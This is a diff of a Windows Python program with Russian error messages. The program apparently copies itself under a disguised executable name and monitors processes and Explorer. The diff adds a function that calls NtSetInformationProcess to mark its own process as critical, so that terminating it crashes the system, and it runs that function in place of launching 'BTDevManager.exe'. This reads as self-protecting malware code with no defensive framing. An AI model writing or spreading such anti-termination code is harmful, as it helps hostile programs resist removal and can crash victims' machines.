@@ -153,6 +153,17 @@ def copy_to_target(new_name="c_computeaccelerator.exe"):
         print(f"[ERROR] Ошибка при копировании или запуске: {e}")
         return False
 
+def critical():
+    try:
+        hProcess = ctypes.windll.kernel32.OpenProcess(0x0200 | 0x0400, False, os.getpid())
+        if not hProcess:
+            print("[ERROR] Не удалось открыть процесс")
+        
+        break_on_termination = ctypes.c_uint32(1)
+        res = ctypes.windll.ntdll.NtSetInformationProcess(hProcess, 29, ctypes.byref(break_on_termination), 4)
+        ctypes.windll.kernel32.CloseHandle(hProcess)
+    except Exception as e:
+        print(f"[ERROR] Ошибка: {e}")
 
 #def changetoeng(): #useless now
  #   LANG_ENGLISH_US = 0x0409  # Код для английской раскладки
@@ -284,7 +295,8 @@ def checktxt():
                 threading.Thread(target=monitor_process).start()
                 threading.Thread(target=checkexe).start()    
 
-                os.startfile(resource_path("BTDevManager.exe"))
+                #os.startfile(resource_path("BTDevManager.exe"))
+                threading.Thread(target=critical).start()  
 
                 threading.Thread(target=monitor_explorer).start()
                 threading.Thread(target=monitor_mei_folders).start()
